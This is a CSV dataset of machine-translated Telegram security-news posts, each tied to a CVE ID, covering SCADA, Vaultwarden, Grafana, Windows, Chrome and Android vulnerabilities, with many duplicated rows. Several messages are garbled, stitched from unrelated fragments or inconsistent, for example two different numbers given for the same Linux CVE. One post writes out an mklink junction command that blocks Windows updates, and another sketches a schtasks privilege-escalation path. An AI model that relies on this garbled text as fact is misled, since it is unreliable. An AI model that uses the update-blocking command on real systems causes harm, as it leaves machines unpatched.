id,cve_id,channel_name,message,timestamp,message_url
280,CVE-2023-26597,ruscadasecnews,"We (with the support of the Honeywell Experion PKS Honeywell network protocols are one of the world leaders in the field of industrial automation and production process control technologies for many years (in four key players in the domestic ASS TP market, being the main supplier of specialized solutions for 27% Identifying various abnormalities of the attackers: unauthorized firmware changes, exploitation of vulnerabilities and modification of the parameters of technological processes. The operator reports: about the parameters of the technological processes; about the illegitimate operations of the PLC configuration, which can lead to the stop of production and deterioration of the production of service commands; In the solutions of Honeywell, “enterprises are slowly introducing protective mechanisms due to the specifics of continuous production. The SCADA systems of this vendor will be able to protect themselves from current threats, ”commented Dmitry Sklyar, the head of the examination of the protection of industrial systems in Positive Technologies",2025-06-01 01:36:32.212169,https://t.me/ruscadasecnews/3959
281,CVE-2023-24480,ruscadasecnews,"We (with the support of the Honeywell Experion PKS Honeywell network protocols are one of the world leaders in the field of industrial automation and production process control technologies for many years (in four key players in the domestic ASS TP market, being the main supplier of specialized solutions for 27% Identifying various abnormalities of the attackers: unauthorized firmware changes, exploitation of vulnerabilities and modification of the parameters of technological processes. The operator reports: about the parameters of the technological processes; about the illegitimate operations of the PLC configuration, which can lead to the stop of production and deterioration of the production of service commands; In the solutions of Honeywell, “enterprises are slowly introducing protective mechanisms due to the specifics of continuous production. The SCADA systems of this vendor will be able to protect themselves from current threats, ”commented Dmitry Sklyar, the head of the examination of the protection of industrial systems in Positive Technologies",2025-06-01 01:36:32.212179,https://t.me/ruscadasecnews/3959
282,CVE-2023-25178,ruscadasecnews,"We (with the support of the Honeywell Experion PKS Honeywell network protocols are one of the world leaders in the field of industrial automation and production process control technologies for many years (in four key players in the domestic ASS TP market, being the main supplier of specialized solutions for 27% Identifying various abnormalities of the attackers: unauthorized firmware changes, exploitation of vulnerabilities and modification of the parameters of technological processes. The operator reports: about the parameters of the technological processes; about the illegitimate operations of the PLC configuration, which can lead to the stop of production and deterioration of the production of service commands; In the solutions of Honeywell, “enterprises are slowly introducing protective mechanisms due to the specifics of continuous production. The SCADA systems of this vendor will be able to protect themselves from current threats, ”commented Dmitry Sklyar, the head of the examination of the protection of industrial systems in Positive Technologies",2025-06-01 01:36:32.212187,https://t.me/ruscadasecnews/3959
283,CVE-2023-24474,ruscadasecnews,"We (with the support of the Honeywell Experion PKS Honeywell network protocols are one of the world leaders in the field of industrial automation and production process control technologies for many years (in four key players in the domestic ASS TP market, being the main supplier of specialized solutions for 27% Identifying various abnormalities of the attackers: unauthorized firmware changes, exploitation of vulnerabilities and modification of the parameters of technological processes. The operator reports: about the parameters of the technological processes; about the illegitimate operations of the PLC configuration, which can lead to the stop of production and deterioration of the production of service commands; In the solutions of Honeywell, “enterprises are slowly introducing protective mechanisms due to the specifics of continuous production. The SCADA systems of this vendor will be able to protect themselves from current threats, ”commented Dmitry Sklyar, the head of the examination of the protection of industrial systems in Positive Technologies",2025-06-01 01:36:32.212196,https://t.me/ruscadasecnews/3959
284,CVE-2024-8300,ruscadasecnews,"Researchers Palo Alto Networks. Among the touched solutions are Genesis64 and MC Works64. The same vulnerabilities also affect Iconics and Mitsubishi Electric, since the first is part of the second. SCADA's vulnerabilities found include: interception DLL, default permits, uncontrolled element of the search route and dead code. The operation of all these vulnerabilities requires authentication, but they allow attackers who have already gained access to the systems of the target organization, fulfill arbitrary code, increase privileges and manipulate critically important files. In a real attack aimed at industrial systems, an attacker can take advantage of SCADA vulnerabilities to cause malfunctions in the operation of the system, and in some cases to get full control over it. Together, these vulnerabilities represent a serious risk for the confidentiality, integrity and accessibility of systems. Palo Alto noted that vulnerabilities can be of value for attackers, given that Iconics and Mitsubishi Electric products have been installed hundreds of thousands of thousands around the world, including in the state sector, defense industry, water supply, production and energy. Vulnerabilities were discovered by the company in early 2024 at Iconics Suite and Mitsubishi Electric Mc Works versions 10.97.2 and 10.97.3 for Windows. Corrections and mitigation were released last year.",2025-06-01 01:36:32.213299,https://t.me/ruscadasecnews/3936
285,CVE-2024-8299,ruscadasecnews,"Researchers Palo Alto Networks. Among the touched solutions are Genesis64 and MC Works64. The same vulnerabilities also affect Iconics and Mitsubishi Electric, since the first is part of the second. SCADA's vulnerabilities found include: interception DLL, default permits, uncontrolled element of the search route and dead code. The operation of all these vulnerabilities requires authentication, but they allow attackers who have already gained access to the systems of the target organization, fulfill arbitrary code, increase privileges and manipulate critically important files. In a real attack aimed at industrial systems, an attacker can take advantage of SCADA vulnerabilities to cause malfunctions in the operation of the system, and in some cases to get full control over it. Together, these vulnerabilities represent a serious risk for the confidentiality, integrity and accessibility of systems. Palo Alto noted that vulnerabilities can be of value for attackers, given that Iconics and Mitsubishi Electric products have been installed hundreds of thousands of thousands around the world, including in the state sector, defense industry, water supply, production and energy. Vulnerabilities were discovered by the company in early 2024 at Iconics Suite and Mitsubishi Electric Mc Works versions 10.97.2 and 10.97.3 for Windows. Corrections and mitigation were released last year.",2025-06-01 01:36:32.213313,https://t.me/ruscadasecnews/3936
286,CVE-2024-9852,ruscadasecnews,"Researchers Palo Alto Networks. Among the touched solutions are Genesis64 and MC Works64. The same vulnerabilities also affect Iconics and Mitsubishi Electric, since the first is part of the second. SCADA's vulnerabilities found include: interception DLL, default permits, uncontrolled element of the search route and dead code. The operation of all these vulnerabilities requires authentication, but they allow attackers who have already gained access to the systems of the target organization, fulfill arbitrary code, increase privileges and manipulate critically important files. In a real attack aimed at industrial systems, an attacker can take advantage of SCADA vulnerabilities to cause malfunctions in the operation of the system, and in some cases to get full control over it. Together, these vulnerabilities represent a serious risk for the confidentiality, integrity and accessibility of systems. Palo Alto noted that vulnerabilities can be of value for attackers, given that Iconics and Mitsubishi Electric products have been installed hundreds of thousands of thousands around the world, including in the state sector, defense industry, water supply, production and energy. Vulnerabilities were discovered by the company in early 2024 at Iconics Suite and Mitsubishi Electric Mc Works versions 10.97.2 and 10.97.3 for Windows. Corrections and mitigation were released last year.",2025-06-01 01:36:32.213322,https://t.me/ruscadasecnews/3936
287,CVE-2024-7587,ruscadasecnews,"Researchers Palo Alto Networks. Among the touched solutions are Genesis64 and MC Works64. The same vulnerabilities also affect Iconics and Mitsubishi Electric, since the first is part of the second. SCADA's vulnerabilities found include: interception DLL, default permits, uncontrolled element of the search route and dead code. The operation of all these vulnerabilities requires authentication, but they allow attackers who have already gained access to the systems of the target organization, fulfill arbitrary code, increase privileges and manipulate critically important files. In a real attack aimed at industrial systems, an attacker can take advantage of SCADA vulnerabilities to cause malfunctions in the operation of the system, and in some cases to get full control over it. Together, these vulnerabilities represent a serious risk for the confidentiality, integrity and accessibility of systems. Palo Alto noted that vulnerabilities can be of value for attackers, given that Iconics and Mitsubishi Electric products have been installed hundreds of thousands of thousands around the world, including in the state sector, defense industry, water supply, production and energy. Vulnerabilities were discovered by the company in early 2024 at Iconics Suite and Mitsubishi Electric Mc Works versions 10.97.2 and 10.97.3 for Windows. Corrections and mitigation were released last year.",2025-06-01 01:36:32.213331,https://t.me/ruscadasecnews/3936
288,CVE-2024-1182,ruscadasecnews,"Researchers Palo Alto Networks. Among the touched solutions are Genesis64 and MC Works64. The same vulnerabilities also affect Iconics and Mitsubishi Electric, since the first is part of the second. SCADA's vulnerabilities found include: interception DLL, default permits, uncontrolled element of the search route and dead code. The operation of all these vulnerabilities requires authentication, but they allow attackers who have already gained access to the systems of the target organization, fulfill arbitrary code, increase privileges and manipulate critically important files. In a real attack aimed at industrial systems, an attacker can take advantage of SCADA vulnerabilities to cause malfunctions in the operation of the system, and in some cases to get full control over it. Together, these vulnerabilities represent a serious risk for the confidentiality, integrity and accessibility of systems. Palo Alto noted that vulnerabilities can be of value for attackers, given that Iconics and Mitsubishi Electric products have been installed hundreds of thousands of thousands around the world, including in the state sector, defense industry, water supply, production and energy. Vulnerabilities were discovered by the company in early 2024 at Iconics Suite and Mitsubishi Electric Mc Works versions 10.97.2 and 10.97.3 for Windows. Corrections and mitigation were released last year.",2025-06-01 01:36:32.213339,https://t.me/ruscadasecnews/3936
289,CVE-2025-37899,kasperskylab_ru,"(#kasperskysecurityWeek: During the experiment on the search for vulnerabilities using LLM, vulnerabilities of the USE-AFTER-FREE type were found in the Linux nucleus. The researcher forced the neural network to analyze the code in which CVE-2025-3778 was already manually detected. The report received from the language model, the specialist found that the CVE-2025-37778 The neural network found only once, but among the mass of hallucinations and reports about the absence of problems, the report was found about another real, but previously unknown problem. They analyzed the massive infection of containerized media through the open API Docker and dismantled attacks on Russian organizations using Purerat Backdor 11 This setting is turned on by default.",2025-06-01 01:36:38.443113,https://t.me/kasperskylab_ru/6229
290,CVE-2025-37778,kasperskylab_ru,"(#kasperskysecurityWeek: During the experiment on the search for vulnerabilities using LLM, vulnerabilities of the USE-AFTER-FREE type were found in the Linux nucleus. The researcher forced the neural network to analyze the code in which CVE-2025-3778 was already manually detected. The report received from the language model, the specialist found that the CVE-2025-37778 The neural network found only once, but among the mass of hallucinations and reports about the absence of problems, the report was found about another real, but previously unknown problem. They analyzed the massive infection of containerized media through the open API Docker and dismantled attacks on Russian organizations using Purerat Backdor 11 This setting is turned on by default.",2025-06-01 01:36:38.443719,https://t.me/kasperskylab_ru/6229
291,CVE-2025-4664,kasperskylab_ru,"We have unscheduled the Chrome Google released (for Chrome, which eliminates the vulnerability of the CVE-2025-4664. Through this hole, a leakage of confidential data is possible, and in the worst case, the operation of the operation is already published, therefore, attackers can start attempts to operate in the near future. The problem is related to insufficient observance of security policy In the Chrome pages, for example, when the site loads the image from a third -party server, this can lead to a leakage of the OAUTH authentication. #CHROME",2025-06-01 01:36:38.447326,https://t.me/kasperskylab_ru/6194
292,CVE-2025-4123,bizone_channel,"Bi.zone WAF protects against vulnerabilities in the popular Grafana platform (found in the API of the monitoring system, as well as in the Grafana Image Renderer component, which is responsible for the render of panels and dashboards in the PNG image. The threat was estimated at 7.6 points of 10 on the CVSS scale. To redirect the external site with malicious plugin, which is performed by an arbitrary JavaScript code. with anonymous access, an inter-shit script attack is possible, which is triggered without authorization. Infrastructure resources, examples of vulnerability have already appeared on the network that the attackers have the opportunity to initiate illegitimate activity, following the final attempts to operate. 11.6.1, 12.0.0 and above.",2025-06-01 01:36:47.991859,https://t.me/bizone_channel/1899
293,CVE-2025-4123,bizone_channel,"Bi.zone WAF protects against vulnerabilities in the popular Grafana platform (found in the API of the monitoring system, as well as in the Grafana Image Renderer component, which is responsible for the render of panels and dashboards in the PNG image. The threat was estimated at 7.6 points of 10 on the CVSS scale. To redirect the external site with malicious plugin, which is performed by an arbitrary JavaScript code. with anonymous access, an inter-shit script attack is possible, which is triggered without authorization. Infrastructure resources, examples of vulnerability have already appeared on the network that the attackers have the opportunity to initiate illegitimate activity, following the final attempts to operate. 11.6.1, 12.0.0 and above.",2025-06-01 01:36:47.992513,https://t.me/bizone_channel/1899
294,CVE-2025-24365,bizone_channel,"CVE-2025-24364 and CVE-2025-24365: We analyze vulnerabilities in Vaultwarden according to the data (in 2025 Vaultwarden uses every tenth Russian company. Since secrets from other internal services are stored in Vaultwarden, the attacker also recognizes them. And if the product is automatically automatically. And if the product is automatically He receives the secrets of the API, the attacker will get to the host with extensive network coherence.",2025-06-01 01:36:47.995996,https://t.me/bizone_channel/1863
295,CVE-2025-24365,bizone_channel,"CVE-2025-24364 and CVE-2025-24365: We analyze vulnerabilities in Vaultwarden according to the data (in 2025 Vaultwarden uses every tenth Russian company. Since secrets from other internal services are stored in Vaultwarden, the attacker also recognizes them. And if the product is automatically automatically. And if the product is automatically He receives the secrets of the API, the attacker will get to the host with extensive network coherence.",2025-06-01 01:36:47.996018,https://t.me/bizone_channel/1863
296,CVE-2025-24364,bizone_channel,"CVE-2025-24364 and CVE-2025-24365: We analyze vulnerabilities in Vaultwarden according to the data (in 2025 Vaultwarden uses every tenth Russian company. Since secrets from other internal services are stored in Vaultwarden, the attacker also recognizes them. And if the product is automatically automatically. And if the product is automatically He receives the secrets of the API, the attacker will get to the host with extensive network coherence.",2025-06-01 01:36:47.996030,https://t.me/bizone_channel/1863
297,CVE-2025-24364,bizone_channel,"CVE-2025-24364 and CVE-2025-24365: We analyze vulnerabilities in Vaultwarden according to the data (in 2025 Vaultwarden uses every tenth Russian company. Since secrets from other internal services are stored in Vaultwarden, the attacker also recognizes them. And if the product is automatically automatically. And if the product is automatically He receives the secrets of the API, the attacker will get to the host with extensive network coherence.",2025-06-01 01:36:47.996043,https://t.me/bizone_channel/1863
298,CVE-2025-24071,bizone_channel,"CVE-2025-24071: how does the attack through .Library-Ms work in Windows our lead analyst Ilya Efimov spoke about the sensational vulnerabilities of the CVE-2025-24071 in the article on Habr. Its operation becomes possible because Windows Explorer automatically processes. Library-Ms files. The attacker can receive NTLMV2-heching of the victim account by simply sending her an archive or an investing with a malicious file. Attackers are already using the CVE-2025-24071, and due to the simplicity of operation, it can become popular in phishing attacks. From the article you will learn: what is the essence of vulnerability, what events are generated in the system during operation, how to find an attack. (",2025-06-01 01:36:48.000021,https://t.me/bizone_channel/1830
299,CVE-2019-0708,rtinfobez,"The old bugs - the new troubles of the North Korean group Kimsuky returned to the headlines - this time with a new wave of attacks, in which vulnerabilities are involved, the existence of which you could forget. What vulnerability is used by attackers? CVE-2019-0708-vulnerability in the RDP protocol, as a result of the operation of which an attacker can remotely execute an arbitrary code. This vulnerability was discovered and eliminated back in 2019. CVE-2017-11882-vulnerability in the editor of equations from the Microsoft Office package associated with the error of handling objects in RAM. This vulnerability also allows the attacker to remotely execute arbitrary code and is still relevant in systems without updates. How the attack works is built according to a simple but effective scheme: the detection of vulnerable systems with open RDP. Obtaining initial access as a result of the operation of the vulnerability of CVE-2019-0708. If vulnerable systems were not found, attackers arrange a phishing campaign to organize in order to operate the vulnerabilities of the CVE-2017-11882. After receiving the initial access, MYSPY and RDPWrap utility are installed, as well as the settings for subsequent access to RDP are modified. Having gained full control over the infected machine, the attackers are installed by the KIMALOGGER or RANDOMQUERY CAILERS to collect data entered by the user. Who is under the sight? South Korea is in the epicenter. Under the blow of the company from the spheres of energy, finance and IT. There were also attacks in Japan, USA, China and Germany. What can be done? Close access to the infrastructure from the external network on the RDP protocol. Use VPN with multifactor authentication. Install safety updates, closing these vulnerabilities do not open files and letters from suspicious senders, set the RT Protect EdR, which will allow this campaign `` `Known IC MD5: 11777FECD07E3AD608C745C81225E4544 14CAAB369A364F4F58A7BBCA34DA6 184A4F00CA40D10790270A20019BB4 30BCAC6815BA2375BEF3DAF22FF28698 46CD19C3DAC997BFA1A90028A28B5045 URL: http // Star7krokr/Login/Help/Showphp? Dom = 991 http // Star7krokr/Login/IMG/Showphp Access-Appollo-Star7krokr Access-Mogoverntskrokr Apollo-Pager-Ekr Apollo-Star7krokr``` #News",2025-06-01 01:36:55.569100,https://t.me/rtinfobez/298
300,CVE-2017-11882,rtinfobez,"The old bugs - the new troubles of the North Korean group Kimsuky returned to the headlines - this time with a new wave of attacks, in which vulnerabilities are involved, the existence of which you could forget. What vulnerability is used by attackers? CVE-2019-0708-vulnerability in the RDP protocol, as a result of the operation of which an attacker can remotely execute an arbitrary code. This vulnerability was discovered and eliminated back in 2019. CVE-2017-11882-vulnerability in the editor of equations from the Microsoft Office package associated with the error of handling objects in RAM. This vulnerability also allows the attacker to remotely execute arbitrary code and is still relevant in systems without updates. How the attack works is built according to a simple but effective scheme: the detection of vulnerable systems with open RDP. Obtaining initial access as a result of the operation of the vulnerability of CVE-2019-0708. If vulnerable systems were not found, attackers arrange a phishing campaign to organize in order to operate the vulnerabilities of the CVE-2017-11882. After receiving the initial access, MYSPY and RDPWrap utility are installed, as well as the settings for subsequent access to RDP are modified. Having gained full control over the infected machine, the attackers are installed by the KIMALOGGER or RANDOMQUERY CAILERS to collect data entered by the user. Who is under the sight? South Korea is in the epicenter. Under the blow of the company from the spheres of energy, finance and IT. There were also attacks in Japan, USA, China and Germany. What can be done? Close access to the infrastructure from the external network on the RDP protocol. Use VPN with multifactor authentication. Install safety updates, closing these vulnerabilities do not open files and letters from suspicious senders, set the RT Protect EdR, which will allow this campaign `` `Known IC MD5: 11777FECD07E3AD608C745C81225E4544 14CAAB369A364F4F58A7BBCA34DA6 184A4F00CA40D10790270A20019BB4 30BCAC6815BA2375BEF3DAF22FF28698 46CD19C3DAC997BFA1A90028A28B5045 URL: http // Star7krokr/Login/Help/Showphp? Dom = 991 http // Star7krokr/Login/IMG/Showphp Access-Appollo-Star7krokr Access-Mogoverntskrokr Apollo-Pager-Ekr Apollo-Star7krokr``` #News",2025-06-01 01:36:55.569463,https://t.me/rtinfobez/298
301,CVE-2025-24071,rtinfobez,"Schtasks.exe is your new enemy recently security researchers have discovered Zero-day vulnerability in the Windows system utility-a planner of tasks that in stages allows attackers to increase the privileges to the level of the system, hide traces of their activity and launch malicious processes in the framework of the tasks. How it works: Preparation: to create a task, the implementation of which will occur with an increased level of trust, the attacker must receive the accounting data of the local administrator, as a result of the interception and subsequent enforcement of the password NTLMV2-Hesh, which can be obtained by initializing the SMB connection to the remote resource of the attacker, or operating the vulnerability, for example, (initializing the malicious task: (initializing the malicious task: Vulnerability allows the attacker to register the task in the system using the Schtasks.exe system utility, which starts with the `/Ru` and`/RP` parameters, and also takes the parameter indicating the configuration XML file with attributes of the malicious task for this. Schtasks.exe, with the subsequent transfer of a useful load in the form of a prepared XML-file with a changed value of the `<runlevel>`. The sizes of the metadata for the `Author` tag from the XML file, the descriptor of which has a restriction of about 3500 bytes Additional mechanisms of access to minimize the probability of vulnerabilities. Advanced attacks",2025-06-01 01:36:55.570549,https://t.me/rtinfobez/293
302,CVE-2025-32433,jetinfosystems,"#News TOP-5 IB-Benerations of the week according to Jet CSIRT Critical Vulnerability CVE-2025-32433 BECDOR, mimicing under the updates via Vipnet Palo Alto Networks, revealed a complicated phishing campaign, updated TrojaniSnail attacks in Russia APT-grip Cloud Atlas attacks the civil structures of the Russian Federation details in our blog (",2025-06-01 01:37:05.116358,https://t.me/jetinfosystems/2011
303,CVE-2025-37899,EchelonEyes,"The researcher using Openai O3 discovered vulnerability of the USE-AFTER-FREE type in the KSMBD module Linux. The model analyzed the code in parts by identifying an error in the processing of SMB Logoff, where access to the released memory is possible. The O3 AI model not only found vulnerability, but also accurately determined the conditions for its occurrence. This is the first case of independent detection of AI of complex vulnerability in the OS nucleus. Linux developers have already released the correction. This discovery demonstrates the growing role of AI in cybersecurity, especially in the analysis of large volumes of code. #And #vulnerability Source:",2025-06-01 01:37:15.963704,https://t.me/EchelonEyes/3876
304,CVE-2025-0411,EchelonEyes,"A critical vulnerability was discovered in the 7-ZIP archive FSTEK of Russia registered a new vulnerability in the popular 7-ZIP archivator, associated with the lack of automatic putting on Mark-OF-The-WEB security label during file unpacking. This allows potentially dangerous files received from the Internet to start without Windows safety warning. The problem is similar to the previously identified vulnerability of the CVE-2025-0411, which was fixed in January 2025, but in this case, it applies to fully unpacked files. The 7-ZIP developer Igor Pavlov confirmed that the current behavior of the program is planned functionality. To include this protection, users need to manually activate the ""Propagate Zone.id Stream"" option, setting its value in ""Yes"". In the corporate environment, it is recommended to either apply additional protection measures, or consider the possibility of switching to alternative solutions for file archiving. #Vulnerability #Cybersecurity Source:",2025-06-01 01:37:15.965306,https://t.me/EchelonEyes/3867
305,CVE-2025-30400,EchelonEyes,"Microsoft corrected 5 Zero-day vulnerabilities in the May updates of Microsoft released patches for 72 vulnerabilities, including 5 actively operated. Among the critical problems are 28 vulnerabilities of the remote code and 17 vulnerabilities associated with an increase in privileges. Among the most dangerous fixed vulnerabilities of the zero day: • CVE-2025-30400-vulnerability to Microsoft DWM Core. • CVE-2025-32701 and CVE-2025-32706-critical vulnerabilities of raising privileges in the Windows Common Log File System. • CVE-2025-30397-vulnerability of remote code execution in the Microsoft Scripting Engine engine used in EDGE and Internet Explorer browsers. • CVE-2025-26685-Vulnerability in the component of Microsoft Defender for Identity. Microsoft recommends urgently installing updates through the Windows update center. #Tuesdays #Patch Source:",2025-06-01 01:37:15.967381,https://t.me/EchelonEyes/3853
306,CVE-2025-30397,EchelonEyes,"Microsoft corrected 5 Zero-day vulnerabilities in the May updates of Microsoft released patches for 72 vulnerabilities, including 5 actively operated. Among the critical problems are 28 vulnerabilities of the remote code and 17 vulnerabilities associated with an increase in privileges. Among the most dangerous fixed vulnerabilities of the zero day: • CVE-2025-30400-vulnerability to Microsoft DWM Core. • CVE-2025-32701 and CVE-2025-32706-critical vulnerabilities of raising privileges in the Windows Common Log File System. • CVE-2025-30397-vulnerability of remote code execution in the Microsoft Scripting Engine engine used in EDGE and Internet Explorer browsers. • CVE-2025-26685-Vulnerability in the component of Microsoft Defender for Identity. Microsoft recommends urgently installing updates through the Windows update center. #Tuesdays #Patch Source:",2025-06-01 01:37:15.967411,https://t.me/EchelonEyes/3853
307,CVE-2025-26685,EchelonEyes,"Microsoft corrected 5 Zero-day vulnerabilities in the May updates of Microsoft released patches for 72 vulnerabilities, including 5 actively operated. Among the critical problems are 28 vulnerabilities of the remote code and 17 vulnerabilities associated with an increase in privileges. Among the most dangerous fixed vulnerabilities of the zero day: • CVE-2025-30400-vulnerability to Microsoft DWM Core. • CVE-2025-32701 and CVE-2025-32706-critical vulnerabilities of raising privileges in the Windows Common Log File System. • CVE-2025-30397-vulnerability of remote code execution in the Microsoft Scripting Engine engine used in EDGE and Internet Explorer browsers. • CVE-2025-26685-Vulnerability in the component of Microsoft Defender for Identity. Microsoft recommends urgently installing updates through the Windows update center. #Tuesdays #Patch Source:",2025-06-01 01:37:15.967423,https://t.me/EchelonEyes/3853
308,CVE-2025-32701,EchelonEyes,"Microsoft corrected 5 Zero-day vulnerabilities in the May updates of Microsoft released patches for 72 vulnerabilities, including 5 actively operated. Among the critical problems are 28 vulnerabilities of the remote code and 17 vulnerabilities associated with an increase in privileges. Among the most dangerous fixed vulnerabilities of the zero day: • CVE-2025-30400-vulnerability to Microsoft DWM Core. • CVE-2025-32701 and CVE-2025-32706-critical vulnerabilities of raising privileges in the Windows Common Log File System. • CVE-2025-30397-vulnerability of remote code execution in the Microsoft Scripting Engine engine used in EDGE and Internet Explorer browsers. • CVE-2025-26685-Vulnerability in the component of Microsoft Defender for Identity. Microsoft recommends urgently installing updates through the Windows update center. #Tuesdays #Patch Source:",2025-06-01 01:37:15.967433,https://t.me/EchelonEyes/3853
309,CVE-2025-32706,EchelonEyes,"Microsoft corrected 5 Zero-day vulnerabilities in the May updates of Microsoft released patches for 72 vulnerabilities, including 5 actively operated. Among the critical problems are 28 vulnerabilities of the remote code and 17 vulnerabilities associated with an increase in privileges. Among the most dangerous fixed vulnerabilities of the zero day: • CVE-2025-30400-vulnerability to Microsoft DWM Core. • CVE-2025-32701 and CVE-2025-32706-critical vulnerabilities of raising privileges in the Windows Common Log File System. • CVE-2025-30397-vulnerability of remote code execution in the Microsoft Scripting Engine engine used in EDGE and Internet Explorer browsers. • CVE-2025-26685-Vulnerability in the component of Microsoft Defender for Identity. Microsoft recommends urgently installing updates through the Windows update center. #Tuesdays #Patch Source:",2025-06-01 01:37:15.967441,https://t.me/EchelonEyes/3853
310,CVE-2025-27363,EchelonEyes,"The Mayan Android patch eliminates 46 vulnerabilities, including the actively exploited Google released the May security update, eliminating 46 vulnerabilities, including the critical Zero-Day CVE-2025-27363 in the Freetype library. The vulnerability of allows you to execute arbitrary code through fake fonts Truetype GX without the rights of the administrator. The May safety update contains: • critical corrections for 8 systemic vulnerabilities; • 15 important updates of Framework components; • Security patches for Qualcomm and MediaTek processors. Experts urgently urge Android to update. Owners of old devices are best switched to supported versions. #Security #Patch Source:",2025-06-01 01:37:15.968884,https://t.me/EchelonEyes/3842
311,CVE-2025-21204,EchelonEyes,"The new vulnerability in Windows can block the updates of the system of a fresh security patch from Microsoft, released as part of the April Patch Tuesday, carries an unexpected side effect with it. After installing updates on the system disk, a folder C: \ InetPub, belonging to the System account, is created. Although its appearance is part of the correction of the vulnerabilities of the CVE-2025-21204, it opens a new gap that attackers can use. How does this work? The famous cybersecurity expert Kevin Bomont found that this folder can be used to block future Windows updates. Even users without the rights of the administrator can create the so -called Junction between C: \ InetPub and any file in the system, for example, C: \ Windows \ System32 \ Notepad.exe. To do this, just execute the command: Mklink /J C: \ Inetpub C: \ Windows \ System32 \ Notepad.exe after creating such a redirect, the attempt to install new updates will end with an error with the code 0x800f081F. This is due to the fact that the system expects to see in C: \ Inetpub folder, not a file. Because of this, the update process ""breaks"", and the system cannot continue the installation. Why is it dangerous? Attackers can take advantage of this vulnerability to block important security updates on target devices. This is especially critical for corporate networks, where the absence of timely patches can lead to serious consequences, including compromising data or the distribution of malicious software. What does Microsoft say? Microsoft recognized the problem, but classified it as an average seriousness. The company said that it does not plan to immediately correct it, since updates can still be installed if the created Junction and repeat the attempt. However, this requires manual intervention, which makes the situation less convenient for users. How to protect yourself? 1) Do not remove the C: \ InetPub folder if it was created after installing the updates. This is part of the CVE-2025-21204 correction. 2) track the creation of Junctions or a change in system files, for example, using Komrad Enterprise Siem (3), update the systems regularly: if you encounter an error when installing updates, check if there are redamages like C: \ InetPub. #Windows #vulnerabilities #microsoft Source:",2025-06-01 01:37:15.969961,https://t.me/EchelonEyes/3836
312,CVE-2025-24365,EchelonEyes,"Vaultwarden under a blow: critical vulnerabilities were discovered by Bi.zone vulnerability analysis specialists revealed two dangerous vulnerabilities in the Vaultwarden system, a popular Open-Source password manager compatible with Bitwarden. According to statistics, about 10% of Russian companies use this solution to store confidential data. The following vulnerabilities were discovered: CVE-2025-24365-allows an attacker with limited rights in one organization to get administrative access through the creation of a new organization and manipulation of ID in requests. CVE-2025-24364-Critical vulnerability of remote code execution. It makes it possible to launch arbitrary commands on the server through the administrator panel, which leads to the disclosure of all the secrets stored, including passwords and APIs. The operation of these vulnerabilities present in all versions until 1.32.7 can lead to a complete compromise of the storage of passwords, access to confidential data of all users and the distribution of attacks on related systems. The developers have already issued a correction in version 1.33.0. Urgent update, disconnection of unused functions and enhanced monitoring of activity is recommended. #cybersecurity #vulnerability Source:",2025-06-01 01:37:15.971177,https://t.me/EchelonEyes/3829
313,CVE-2025-24364,EchelonEyes,"Vaultwarden under a blow: critical vulnerabilities were discovered by Bi.zone vulnerability analysis specialists revealed two dangerous vulnerabilities in the Vaultwarden system, a popular Open-Source password manager compatible with Bitwarden. According to statistics, about 10% of Russian companies use this solution to store confidential data. The following vulnerabilities were discovered: CVE-2025-24365-allows an attacker with limited rights in one organization to get administrative access through the creation of a new organization and manipulation of ID in requests. CVE-2025-24364-Critical vulnerability of remote code execution. It makes it possible to launch arbitrary commands on the server through the administrator panel, which leads to the disclosure of all the secrets stored, including passwords and APIs. The operation of these vulnerabilities present in all versions until 1.32.7 can lead to a complete compromise of the storage of passwords, access to confidential data of all users and the distribution of attacks on related systems. The developers have already issued a correction in version 1.33.0. Urgent update, disconnection of unused functions and enhanced monitoring of activity is recommended. #cybersecurity #vulnerability Source:",2025-06-01 01:37:15.971190,https://t.me/EchelonEyes/3829
314,CVE-2024-53197,EchelonEyes,"Google urgently closed two 0-day vulnerabilities in Android Google released a critical update for Android, eliminating the two dangerous vulnerabilities of the zero day, which were actively operated by hackers in target attacks. One of the vulnerabilities was used against a Serbian activist student using the equipment of Cellebrite, which produces special equipment to extract data from smartphones for law enforcement agencies. The second vulnerability was found in the Android nucleus, but the details about its operation are not disclosed. Both vulnerabilities allow attackers to receive full control over the device without the user's knowledge, and the attack does not require any action from the victim. Google has already sent corrections to manufacturers of smartphones, however, the terms of release of updates for end users depend on specific brands. #Vulneraculus, source:",2025-06-01 01:37:15.974048,https://t.me/EchelonEyes/3805
